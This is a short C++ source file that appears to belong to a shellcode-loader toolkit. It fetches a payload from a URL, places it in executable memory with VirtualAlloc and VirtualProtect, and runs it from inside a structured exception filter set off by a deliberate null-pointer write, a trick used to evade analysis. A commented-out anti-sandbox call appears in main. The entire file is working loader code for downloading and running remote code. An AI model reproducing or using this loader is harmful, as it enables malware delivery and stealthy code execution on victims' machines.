#include "..\..\Public.hpp"

LPVOID Memory;
int ExceptFilter()
{
	((void(*)())Memory)();
	return EXCEPTION_CONTINUE_EXECUTION;
}

void makeSEH()
{
	int* p = 0x00000000;
	__try
	{
		*p = 17;
	}
	__except (ExceptFilter())
	{
	};
}

void runShellcode()
{
	std::string shellcode = GetShellcodeFromUrl();

	if (shellcode.size() > 0)
	{
		DWORD oldProtect;
		Memory = VirtualAlloc(NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		mc(Memory, shellcode.c_str(), shellcode.size());
		VirtualProtect(Memory, shellcode.size(), PAGE_EXECUTE_READ, &oldProtect);
	}

	makeSEH();
}

int main()
{
//	antiSandbox();
	runShellcode();
	return 0;
}